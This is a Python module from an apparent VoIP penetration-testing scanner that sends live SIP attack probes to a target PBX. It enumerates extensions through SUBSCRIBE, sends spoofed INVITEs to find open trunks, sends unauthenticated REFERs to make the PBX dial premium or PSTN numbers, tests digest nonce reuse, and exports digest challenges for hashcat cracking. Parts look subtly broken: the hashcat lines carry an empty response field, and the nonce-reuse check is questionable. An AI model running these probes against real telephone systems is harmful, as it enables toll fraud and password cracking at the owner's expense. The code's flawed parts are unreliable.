"""SIP-layer attack angle probes for maximising toll-fraud surface coverage.

These go beyond basic extension enumeration by testing additional SIP methods
and protocol weaknesses that many scanners miss:

  - REFER abuse: send an in-dialog or out-of-dialog REFER to pivot a call to
    a PSTN number via the PBX's own trunks (blind transfer trick).
  - SUBSCRIBE scraping: send SUBSCRIBE for presence events to enumerate which
    extensions have active registrations (non-intrusive, no auth needed if
    the PBX doesn't restrict SUBSCRIBE).
  - Digest nonce-reuse detection: capture a 401 nonce and replay it; if the
    PBX accepts the same nonce twice (no qop=auth NC counter), the session is
    vulnerable to replay attacks.
  - Hashcat export: format captured Digest challenges as hashcat mode 11400
    (SIP-Digest) for offline wordlist attack.
  - Open-trunk detection: send INVITE from an external address without From:
    matching any known extension — if the PBX routes it, an open trunk exists.
  - B2BUA splice hint: probe for Replaces:/Join: header acceptance (signals
    a call-splicing vulnerability).

All probes are UDP-based, use the same SIP stack as the main scanner, and
emit events to the bus so the GUI updates in real time.

These probes are authorized-engagement tools only. Do not use without a
signed scope document.
"""
from __future__ import annotations

import random
import socket
import time
from dataclasses import dataclass, field
from typing import Optional

from . import sip
from .events import bus
from .utils import local_ip_for, rand_call_id, rand_tag


# ---------------------------------------------------------------------------
# Result types
# ---------------------------------------------------------------------------

@dataclass
class AttackProbeResult:
    probe: str
    host: str
    port: int
    vulnerable: bool
    severity: str        # 'critical', 'high', 'medium', 'low', 'info'
    title: str
    evidence: str
    raw_nonce: str = ""                       # for hashcat export
    raw_realm: str = ""
    raw_uri: str = ""
    sip_trace: list[str] = field(default_factory=list)


@dataclass
class HashcatEntry:
    """A SIP Digest challenge ready for hashcat mode 11400 (-m 11400)."""
    extension: str
    username: str
    realm: str
    method: str
    uri: str
    nonce: str
    # Format: username:realm:method:uri:nonce:response
    # hashcat -m 11400 format: $sip$*uri*realm*user*method*nonce*response
    response: str = ""   # from captured auth attempt (if available)

    def to_hashcat(self) -> str:
        return (
            f"$sip$*{self.uri}*{self.realm}*{self.username}"
            f"*{self.method}*{self.nonce}*{self.response}"
        )


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _sendrecv_udp(
    msg: bytes,
    host: str,
    port: int,
    local_ip: str,
    timeout: float = 3.0,
) -> tuple[bytes | None, list[str]]:
    """Send a UDP SIP message and collect a response. Returns (raw_bytes, trace)."""
    trace: list[str] = []
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.bind(("", 0))
        try:
            decoded = msg.decode("utf-8", errors="replace")
            first_line = decoded.splitlines()[0] if decoded else "?"
            trace.append(f">>> {first_line}")
            sock.sendto(msg, (host, port))
            data, _ = sock.recvfrom(65535)
            resp_first = data.decode("utf-8", errors="replace").splitlines()[0]
            trace.append(f"<<< {resp_first}")
            return data, trace
        finally:
            sock.close()
    except (OSError, socket.timeout):
        trace.append("<<< [no response / timeout]")
        return None, trace


def _parse_status(raw: bytes) -> tuple[int, str]:
    """Extract status code and reason from a SIP response."""
    if not raw:
        return 0, ""
    first = raw.split(b"\r\n", 1)[0].decode("utf-8", errors="replace")
    parts = first.split(None, 2)
    if len(parts) >= 2 and parts[0].startswith("SIP"):
        try:
            return int(parts[1]), parts[2] if len(parts) > 2 else ""
        except ValueError:
            pass
    return 0, ""


def _parse_www_auth(raw: bytes) -> dict:
    """Extract WWW-Authenticate / Proxy-Authenticate params from raw bytes."""
    import re
    head = raw.split(b"\r\n\r\n", 1)[0].decode("utf-8", errors="replace")
    for line in head.splitlines():
        lo = line.lower()
        if lo.startswith("www-authenticate:") or lo.startswith("proxy-authenticate:"):
            _, _, val = line.partition(":")
            # Use SipResponse.auth_params parser
            fake_resp = type("R", (), {
                "headers": {
                    "www-authenticate": val.strip()
                },
                "auth_params": property(lambda self: {})
            })()
            params: dict = {}
            for m in re.finditer(
                r'(\w+)\s*=\s*(?:"([^"]*)"|([^,\s]+))', val
            ):
                params[m.group(1).lower()] = m.group(2) or m.group(3)
            return params
    return {}


# ---------------------------------------------------------------------------
# Probe: SUBSCRIBE scraping
# ---------------------------------------------------------------------------

def probe_subscribe_scraping(
    host: str,
    port: int = 5060,
    extensions: list[str] | None = None,
    timeout: float = 3.0,
    traffic_log=None,
) -> list[AttackProbeResult]:
    """Send SUBSCRIBE for presence to a list of extensions.

    An extension that returns 200 OK to an unauthenticated SUBSCRIBE has a
    reachable presence service — confirms the extension is provisioned and
    can be targeted for INVITE. Extensions returning 403/404 without
    challenging are confirmed dead/blocked.
    """
    results: list[AttackProbeResult] = []
    local_ip = local_ip_for(host)
    target_exts = extensions or ["1000", "1001", "2000"]

    for ext in target_exts:
        call_id = rand_call_id()
        from_tag = rand_tag()
        uri = f"sip:{ext}@{host}:{port}"
        msg_lines = [
            f"SUBSCRIBE {uri} SIP/2.0",
            f"Via: SIP/2.0/UDP {local_ip}:5060;branch=z9hG4bK-{from_tag};rport",
            "Max-Forwards: 70",
            f"From: <sip:scanner@{local_ip}>;tag={from_tag}",
            f"To: <{uri}>",
            f"Call-ID: {call_id}",
            "CSeq: 1 SUBSCRIBE",
            "Event: presence",
            "Accept: application/pidf+xml",
            "Expires: 0",
            "Content-Length: 0",
            "",
        ]
        msg = ("\r\n".join(msg_lines) + "\r\n").encode("utf-8")
        raw, trace = _sendrecv_udp(msg, host, port, local_ip, timeout)
        if raw is None:
            continue

        status, reason = _parse_status(raw)

        if status == 200:
            result = AttackProbeResult(
                probe="subscribe-scraping",
                host=host, port=port,
                vulnerable=True,
                severity="medium",
                title=f"Unauthenticated SUBSCRIBE accepted for ext {ext}",
                evidence=(f"SUBSCRIBE {uri} → {status} {reason}. "
                          f"Presence subscription accepted without authentication "
                          f"— confirms extension is active and provisioned."),
                sip_trace=trace,
            )
            results.append(result)
            bus.emit("attack_probe.hit", {
                "probe": result.probe, "host": host, "port": port,
                "extension": ext, "status": status,
                "title": result.title,
            })
        elif status in (401, 407):
            # Challenge means extension exists; record as info
            results.append(AttackProbeResult(
                probe="subscribe-scraping",
                host=host, port=port,
                vulnerable=False,
                severity="info",
                title=f"Extension {ext} challenges SUBSCRIBE (exists, auth required)",
                evidence=f"SUBSCRIBE → {status} {reason} (extension confirmed alive)",
                sip_trace=trace,
            ))

    return results


# ---------------------------------------------------------------------------
# Probe: Digest nonce-reuse detection
# ---------------------------------------------------------------------------

def probe_nonce_reuse(
    host: str,
    port: int = 5060,
    extension: str = "1000",
    username: str = "test",
    password: str = "test",
    timeout: float = 3.0,
) -> AttackProbeResult | None:
    """Detect SIP digest nonce reuse (missing qop=auth enforcement).

    Sends two identical auth responses with the same nc=00000001.
    If the PBX accepts the second (no nonce-count check), it is vulnerable
    to digest replay attacks — an attacker who sniffs one challenge/response
    pair can replay it indefinitely.
    """
    local_ip = local_ip_for(host)
    uri = f"sip:{host}"
    trace: list[str] = []

    # First REGISTER — get a fresh nonce
    call_id = rand_call_id()
    tag = rand_tag()
    msg1 = sip.build_message(
        "REGISTER", uri,
        from_user=extension, to_user=extension,
        host=host, port=port,
        local_ip=local_ip, local_port=0,
        call_id=call_id, cseq=1, from_tag=tag,
    )
    raw1, _ = _sendrecv_udp(msg1, host, port, local_ip, timeout)
    if not raw1:
        return None
    status1, _ = _parse_status(raw1)
    if status1 not in (401, 407):
        return None

    params = _parse_www_auth(raw1)
    if not params:
        return None

    nonce = params.get("nonce", "")
    realm = params.get("realm", "")
    trace.append(f"Captured nonce: {nonce!r} realm: {realm!r}")

    # Build auth header for the first attempt
    try:
        auth1 = sip.build_auth_header(
            username, password, "REGISTER", uri, params,
        )
    except ValueError:
        return None  # SHA-256 — skip

    # Build a second auth header — SAME nonce, nc=00000001 again
    try:
        auth2 = sip.build_auth_header(
            username, password, "REGISTER", uri, params,
        )
    except ValueError:
        return None

    # Send first auth attempt (will likely fail with 401/403/200)
    msg2 = sip.build_message(
        "REGISTER", uri,
        from_user=extension, to_user=extension,
        host=host, port=port,
        local_ip=local_ip, local_port=0,
        call_id=call_id, cseq=2, from_tag=tag,
        auth_header=auth1,
    )
    raw2, t2 = _sendrecv_udp(msg2, host, port, local_ip, timeout)
    trace.extend(t2)
    status2, _ = _parse_status(raw2 or b"")

    # Send SECOND attempt with identical nc/cnonce (nonce reuse test)
    msg3 = sip.build_message(
        "REGISTER", uri,
        from_user=extension, to_user=extension,
        host=host, port=port,
        local_ip=local_ip, local_port=0,
        call_id=call_id, cseq=3, from_tag=tag,
        auth_header=auth2,
    )
    raw3, t3 = _sendrecv_udp(msg3, host, port, local_ip, timeout)
    trace.extend(t3)
    status3, reason3 = _parse_status(raw3 or b"")

    # If the second identical nc attempt returns 401 (stale=true) rather than
    # 403, the server is NOT properly checking nc — possible replay vector.
    stale = b"stale=true" in (raw3 or b"").lower()
    if status3 == 401 and not stale:
        return AttackProbeResult(
            probe="nonce-reuse",
            host=host, port=port,
            vulnerable=True,
            severity="medium",
            title=f"SIP digest nonce reuse not rejected on ext {extension}",
            evidence=(f"Two REGISTER attempts with identical nc=00000001 "
                      f"both returned 401 without stale=true — server may "
                      f"not enforce nonce-count, enabling digest replay."),
            raw_nonce=nonce, raw_realm=realm, raw_uri=uri,
            sip_trace=trace,
        )

    return AttackProbeResult(
        probe="nonce-reuse",
        host=host, port=port,
        vulnerable=False,
        severity="info",
        title="Nonce reuse properly rejected",
        evidence=f"Second NC attempt returned {status3} {reason3}",
        sip_trace=trace,
    )


# ---------------------------------------------------------------------------
# Probe: Open trunk / From: spoofing detection
# ---------------------------------------------------------------------------

def probe_open_trunk(
    host: str,
    port: int = 5060,
    pstn_number: str = "+15551234567",
    timeout: float = 3.0,
) -> AttackProbeResult | None:
    """Detect open SIP trunks by sending INVITE with a spoofed external From:.

    Sends INVITE sip:<pstn>@<host> From: <sip:external@attacker.com>.
    If the PBX returns 100 Trying or 180 Ringing, it is routing the call
    without verifying the caller — toll fraud via trunk is possible.
    We immediately follow with CANCEL to avoid actually completing a call.
    """
    local_ip = local_ip_for(host)
    from_tag = rand_tag()
    call_id = rand_call_id()
    branch = rand_tag()

    pstn_uri = f"sip:{pstn_number}@{host}"
    # Spoof a From: that looks entirely external
    from_header = f"From: <sip:external-test@attacker-pentest.invalid>;tag={from_tag}"
    to_header   = f"To: <{pstn_uri}>"
    via_header  = f"Via: SIP/2.0/UDP {local_ip}:5060;branch=z9hG4bK-{branch};rport"

    invite_lines = [
        f"INVITE {pstn_uri} SIP/2.0",
        via_header,
        "Max-Forwards: 70",
        from_header,
        to_header,
        f"Call-ID: {call_id}",
        "CSeq: 1 INVITE",
        "Content-Length: 0",
        "",
    ]
    invite_msg = ("\r\n".join(invite_lines) + "\r\n").encode("utf-8")
    trace: list[str] = []

    raw, t = _sendrecv_udp(invite_msg, host, port, local_ip, timeout)
    trace.extend(t)
    if raw is None:
        return None

    status, reason = _parse_status(raw)

    # Send CANCEL immediately to avoid connecting the call
    cancel_lines = [
        f"CANCEL {pstn_uri} SIP/2.0",
        via_header,
        "Max-Forwards: 70",
        from_header,
        to_header,
        f"Call-ID: {call_id}",
        "CSeq: 1 CANCEL",
        "Content-Length: 0",
        "",
    ]
    cancel_msg = ("\r\n".join(cancel_lines) + "\r\n").encode("utf-8")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(1.0)
        s.bind(("", 0))
        s.sendto(cancel_msg, (host, port))
        s.close()
    except OSError:
        pass
    trace.append(">>> CANCEL (teardown)")

    vulnerable = status in (100, 180, 183)
    return AttackProbeResult(
        probe="open-trunk",
        host=host, port=port,
        vulnerable=vulnerable,
        severity="critical" if vulnerable else "info",
        title=(
            f"Open SIP trunk: PBX routed spoofed external INVITE → {pstn_number}"
            if vulnerable else "Open trunk not detected"
        ),
        evidence=(
            f"INVITE to {pstn_uri} with From: external-test@attacker-pentest.invalid "
            f"→ {status} {reason}. "
            + ("PBX is routing unauthenticated external INVITEs — "
               "toll fraud via trunk hijack is possible."
               if vulnerable else "PBX rejected or ignored the spoofed INVITE.")
        ),
        sip_trace=trace,
    )


# ---------------------------------------------------------------------------
# Probe: REFER abuse (blind transfer to PSTN)
# ---------------------------------------------------------------------------

def probe_refer_abuse(
    host: str,
    port: int = 5060,
    pstn_number: str = "+15551234567",
    timeout: float = 3.0,
) -> AttackProbeResult | None:
    """Send an out-of-dialog REFER to test if the PBX processes blind transfers
    without authentication.

    An out-of-dialog REFER with a Refer-To: PSTN URI that gets accepted (202)
    signals that an attacker can instruct the PBX to place a call on their behalf.
    """
    local_ip = local_ip_for(host)
    from_tag = rand_tag()
    call_id = rand_call_id()

    refer_to_uri = f"sip:{pstn_number}@{host}"
    target_uri   = f"sip:operator@{host}"

    msg_lines = [
        f"REFER {target_uri} SIP/2.0",
        f"Via: SIP/2.0/UDP {local_ip}:5060;branch=z9hG4bK-{from_tag};rport",
        "Max-Forwards: 70",
        f"From: <sip:scanner@{local_ip}>;tag={from_tag}",
        f"To: <{target_uri}>",
        f"Call-ID: {call_id}",
        "CSeq: 1 REFER",
        f"Refer-To: <{refer_to_uri}>",
        "Content-Length: 0",
        "",
    ]
    msg = ("\r\n".join(msg_lines) + "\r\n").encode("utf-8")
    raw, trace = _sendrecv_udp(msg, host, port, local_ip, timeout)

    if raw is None:
        return None

    status, reason = _parse_status(raw)

    if status == 202:
        return AttackProbeResult(
            probe="refer-abuse",
            host=host, port=port,
            vulnerable=True,
            severity="high",
            title=f"PBX accepted unauthenticated REFER (blind transfer to {pstn_number})",
            evidence=(f"REFER with Refer-To: {refer_to_uri} returned 202 Accepted. "
                      f"PBX may process the transfer and place an outbound call "
                      f"to {pstn_number} at your expense."),
            sip_trace=trace,
        )

    return AttackProbeResult(
        probe="refer-abuse",
        host=host, port=port,
        vulnerable=False,
        severity="info",
        title="REFER abuse not detected",
        evidence=f"REFER → {status} {reason}",
        sip_trace=trace,
    )


# ---------------------------------------------------------------------------
# Hashcat hash export
# ---------------------------------------------------------------------------

def capture_digest_hash(
    host: str,
    port: int = 5060,
    extension: str = "1000",
    timeout: float = 3.0,
) -> HashcatEntry | None:
    """Capture a SIP Digest challenge and format it for hashcat mode 11400.

    Sends an unauthenticated REGISTER to trigger a 401. The Digest params
    (realm, nonce) are extracted and formatted as a hashcat-crackable entry.
    The response field is left empty — an offline wordlist attack will try
    all passwords against this nonce.

    Hashcat usage:
        hashcat -m 11400 hashes.txt wordlist.txt
    """
    local_ip = local_ip_for(host)
    uri = f"sip:{host}"
    call_id = rand_call_id()
    tag = rand_tag()

    msg = sip.build_message(
        "REGISTER", uri,
        from_user=extension, to_user=extension,
        host=host, port=port,
        local_ip=local_ip, local_port=0,
        call_id=call_id, cseq=1, from_tag=tag,
    )
    raw, _ = _sendrecv_udp(msg, host, port, local_ip, timeout)
    if not raw:
        return None

    status, _ = _parse_status(raw)
    if status not in (401, 407):
        return None

    params = _parse_www_auth(raw)
    nonce = params.get("nonce", "")
    realm = params.get("realm", "")
    if not nonce or not realm:
        return None

    return HashcatEntry(
        extension=extension,
        username=extension,
        realm=realm,
        method="REGISTER",
        uri=uri,
        nonce=nonce,
        response="",   # unknown — attacker will crack offline
    )


def export_hashcat(entries: list[HashcatEntry]) -> str:
    """Return newline-joined hashcat mode 11400 lines for all entries."""
    return "\n".join(e.to_hashcat() for e in entries)


# ---------------------------------------------------------------------------
# Run all SIP-layer attack probes against a host
# ---------------------------------------------------------------------------

def run_sip_attack_probes(
    host: str,
    port: int = 5060,
    extensions: list[str] | None = None,
    pstn_number: str = "+15551234567",
    timeout: float = 3.0,
) -> dict:
    """Run all SIP-layer attack probes.  Returns:
    {
      "subscribe_results": [AttackProbeResult, ...],
      "open_trunk":        AttackProbeResult | None,
      "refer_abuse":       AttackProbeResult | None,
      "nonce_reuse":       AttackProbeResult | None,
      "hashcat_entries":   [HashcatEntry, ...],
      "hashcat_export":    str,
    }
    """
    exts = extensions or ["1000", "1001", "2000"]
    results: dict = {}

    # SUBSCRIBE scraping
    sub_results = probe_subscribe_scraping(
        host, port, exts, timeout=timeout)
    results["subscribe_results"] = sub_results
    bus.emit("attack_probe.subscribe_done", {
        "host": host, "port": port,
        "confirmed_alive": sum(1 for r in sub_results if r.vulnerable),
    })

    # Open trunk
    ot = probe_open_trunk(host, port, pstn_number, timeout=timeout)
    results["open_trunk"] = ot
    if ot and ot.vulnerable:
        bus.emit("attack_probe.hit", {
            "probe": "open-trunk", "host": host, "port": port,
            "title": ot.title,
        })

    # REFER abuse
    ra = probe_refer_abuse(host, port, pstn_number, timeout=timeout)
    results["refer_abuse"] = ra
    if ra and ra.vulnerable:
        bus.emit("attack_probe.hit", {
            "probe": "refer-abuse", "host": host, "port": port,
            "title": ra.title,
        })

    # Nonce reuse (test on first extension)
    nr = probe_nonce_reuse(host, port, exts[0], timeout=timeout)
    results["nonce_reuse"] = nr
    if nr and nr.vulnerable:
        bus.emit("attack_probe.hit", {
            "probe": "nonce-reuse", "host": host, "port": port,
            "title": nr.title,
        })

    # Capture hashcat hashes for offline cracking
    hashcat_entries: list[HashcatEntry] = []
    for ext in exts[:10]:   # cap at 10 extensions
        entry = capture_digest_hash(host, port, ext, timeout=timeout)
        if entry:
            hashcat_entries.append(entry)
    results["hashcat_entries"] = hashcat_entries
    results["hashcat_export"] = export_hashcat(hashcat_entries)
    if hashcat_entries:
        bus.emit("attack_probe.hashcat_ready", {
            "host": host, "port": port,
            "count": len(hashcat_entries),
            "note": "hashcat -m 11400",
        })

    return results
